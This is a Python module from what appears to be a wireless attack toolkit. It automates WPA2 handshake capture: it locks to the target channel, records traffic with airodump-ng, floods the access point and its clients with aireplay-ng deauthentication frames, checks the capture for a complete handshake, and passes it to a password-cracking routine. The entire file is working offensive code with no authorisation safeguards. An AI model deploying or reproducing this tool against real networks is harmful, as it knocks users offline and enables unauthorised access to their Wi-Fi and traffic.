"""
attacks/wpa2.py - WPA2 4-way handshake capture via deauthentication
"""

import subprocess
import threading
import time
import os
import tempfile
from utils.logger import Logger
from utils.tools import check_tool

log = Logger()


class WPA2Attack:
    def __init__(self, interface, target, wordlist=None,
                 output_dir="./captures", deauth_count=5):
        self.interface = interface
        self.target = target
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.deauth_count = deauth_count
        self.timeout = 60  # seconds to wait for handshake
        self._capfile = None

    def run(self):
        """Capture WPA2 handshake via deauth"""
        bssid = self.target["bssid"]
        channel = self.target["channel"]
        essid = self.target["essid"]
        clients = self.target.get("clients", [])

        # Set channel
        self._set_channel(channel)

        # Build capture base path and clean up any old caps for this target
        # so airodump-ng always writes -01.cap (avoids filename collision bug)
        safe_essid = essid.replace(' ', '_')
        safe_bssid = bssid.replace(':', '')
        capfile_base = os.path.join(self.output_dir, f"wpa2_{safe_essid}_{safe_bssid}")

        # BUG 5 FIX: old caps are owned by root — wrap removal in try/except
        for old in [f"{capfile_base}-{i:02d}.cap" for i in range(1, 10)]:
            if os.path.exists(old):
                try:
                    os.remove(old)
                except PermissionError:
                    # File owned by root from a previous sudo run; try via subprocess
                    subprocess.run(["rm", "-f", old], capture_output=True)

        self._capfile = capfile_base + "-01.cap"

        log.info(f"Starting capture on CH {channel} for {essid}")

        cap_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", capfile_base,
            "--output-format", "cap",
            self.interface
        ]

        cap_proc = subprocess.Popen(
            cap_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Wait a moment then deauth
        time.sleep(2)

        handshake_found = False
        start = time.time()
        client_info = f" | {len(clients)} client(s)" if clients else " | no clients seen (deauthing broadcast)"

        while time.time() - start < self.timeout:
            elapsed = int(time.time() - start)

            # Send deauth every 5s
            if elapsed % 5 == 0:
                self._deauth(bssid, clients)

            # Find whatever cap file airodump-ng actually wrote
            actual_cap = self._find_capfile(capfile_base)
            if actual_cap and elapsed % 2 == 0:
                if self._check_handshake(actual_cap, bssid):
                    self._capfile = actual_cap
                    handshake_found = True
                    break

            print(f"\r[*] Waiting for handshake... {elapsed}s / {self.timeout}s{client_info}", end="", flush=True)
            time.sleep(1)

        print()
        cap_proc.terminate()
        cap_proc.wait()

        if handshake_found:
            log.success(f"Handshake captured: {self._capfile}")
            return {"captured": True, "capfile": self._capfile}
        else:
            log.warn("No handshake captured within timeout")
            log.warn("Tip: Make sure a device is actively connected to the target network.")
            return {"captured": False}

    def _find_capfile(self, capfile_base):
        """Find the actual .cap file written by airodump-ng (handles -01, -02, etc.)"""
        for i in range(1, 20):
            path = f"{capfile_base}-{i:02d}.cap"
            if os.path.exists(path) and os.path.getsize(path) > 0:
                return path
        return None

    def _set_channel(self, channel):
        """Lock interface to target channel"""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True
            )
        except Exception:
            pass

    def _deauth(self, bssid, clients):
        """Send deauthentication packets"""
        if not check_tool("aireplay-ng"):
            log.warn("aireplay-ng not found, skipping deauth")
            return

        # Deauth broadcast (kicks all clients)
        cmd = [
            "aireplay-ng",
            "--deauth", str(self.deauth_count),
            "-a", bssid,
            self.interface
        ]

        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        log.info(f"Sent {self.deauth_count} deauth frames to {bssid}")

        # Also deauth specific clients if known
        for client in clients[:3]:  # max 3 clients
            cmd_client = [
                "aireplay-ng",
                "--deauth", str(self.deauth_count),
                "-a", bssid,
                "-c", client,
                self.interface
            ]
            subprocess.Popen(
                cmd_client,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

    def _check_handshake(self, capfile, bssid):
        """
        Verify a usable WPA2 handshake exists in the capture file.

        BUG 1 FIX: The old check used `"handshake" in stdout.lower()` which
        matched the string "0 handshake" — always returning True even with no
        handshake.  We now run aircrack-ng WITHOUT -b so it prints the full
        table including the handshake count per BSSID, then look for the
        exact string "WPA (1 handshake)" which only appears when ≥1 complete
        4-way exchange was captured.
        """
        # Method 1: aircrack-ng — run WITHOUT -b to get the BSSID table
        # which prints "WPA (0 handshake)" or "WPA (1 handshake)" per AP.
        if check_tool("aircrack-ng"):
            result = subprocess.run(
                ["aircrack-ng", capfile],
                capture_output=True, text=True, timeout=10
            )
            # Only match the exact count — "1 handshake" never appears in
            # the "0 handshake" output, so no false positives.
            if "1 handshake" in result.stdout:
                return True
            # If aircrack-ng explicitly says 0, no need to check tshark.
            if "0 handshake" in result.stdout:
                return False

        # Method 2: tshark — verify EAPOL from BOTH AP and client (fallback)
        if check_tool("tshark"):
            result = subprocess.run(
                ["tshark", "-r", capfile,
                 "-Y", "eapol",
                 "-T", "fields",
                 "-e", "wlan.sa"],
                capture_output=True, text=True, timeout=10
            )
            senders = set(
                l.strip().lower()
                for l in result.stdout.splitlines() if l.strip()
            )
            ap = bssid.lower()
            clients = senders - {ap}
            # Need EAPOL frames from AP *and* at least one distinct client
            if ap in senders and clients:
                return True

        return False

    def crack(self, capfile):
        """Crack handshake — delegates to CrackOrchestrator.

        Kept for backward compatibility with AttackOrchestrator's flow.
        The real cracking logic (hashcat, rules, masks, aircrack fallback)
        lives in cracking.crack_orchestrator.
        """
        from cracking.crack_orchestrator import CrackOrchestrator, CrackConfig

        config = CrackConfig(
            wordlist=self.wordlist,
            bssid=self.target["bssid"],
        )
        orchestrator = CrackOrchestrator(config)
        return orchestrator.crack(capfile)

